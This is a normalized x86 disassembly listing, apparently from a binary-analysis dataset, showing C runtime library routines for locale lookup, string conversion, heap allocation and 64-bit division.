inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_10036a26
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_10036b31
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_10036a4a
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10027150
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_10036a7e
push esi
mov edi eax
call sub_10027160
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_10036ba5
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002f139
mov esi eax
mov edx edi
add esi 0x9c
call sub_10036a4a
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003a9a5
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003aaff
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10027160
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_10036a26
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10027160
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_10036b31
pop ecx
pop ecx
test eax eax
je r-xdata
sub_10036d77
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002f139
mov esi eax
mov edx edi
add esi 0x9c
call sub_10036a4a
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_10036b31
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_10036e38
push [ esi ]
call sub_10027160
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10027160
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_10036a7e
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_10036ba5
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_10036e9f
push [ esi ]
call sub_10027160
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_10036a7e
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_10036d77
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_10036edb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002f139
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_10036920
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_10036982
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_10027160
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_10036a99
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_10036e9f
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_10036920
add esp 0xc
test eax eax
je r-xdata
call sub_10036e38
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_10036e9f
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_10036e38
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1002dfbe
add esp 0x10
sub_100370cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_100373d0
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_10037419
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_10027a85
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10027650
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1002d97d
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1002a4a4
pop ecx
cmp eax ebx
je r-xdata
call sub_100375d0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10037286
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_100370cc
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100372c8
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_10037390
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100373d0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1003a9f7
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
sub_10037419
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_10027650
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_1002d97d
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax edi
je r-xdata
call sub_100375d0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10027160
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_1002ddf5
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_10027a85
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_100375fc
push 0xc
push r--data
call sub_1002fdfc
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1002d4db
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1002fe41
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_1002e854
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10030a10
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100376f8
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_10027650
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_1003771a
push 0x10
push r--data
call sub_1002fdfc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1002a4a4
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_10027a85
pop ecx
jmp r-xdata
call sub_1002fe41
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_1002e854
pop ecx
call sub_1002d4db
push 0x4
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10030231
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003785e
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1003072f
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_1002e854
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10030a10
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1002d4db
call sub_1002d4db
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_1002e854
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002d499
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1002d4db
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1002d4db
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_1002a0f0
push ebx
call sub_10030231
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_10030261
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002d499
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_1002a0f0
push ebx
push [ ebp - 0x20 ]
call sub_10030261
add esp 0x14
mov eax esi
sub_10037935
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1003771a
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10034bae
pop ecx
mov ebx eax
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_10027801
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_10027650
add esp 0xc
sub_100379b0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10037a45
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10037a90
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1002e26b
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_1002aa9e
test eax eax
movsx eax [ esi ]
push eax
call sub_1002e26b
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10037b03
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
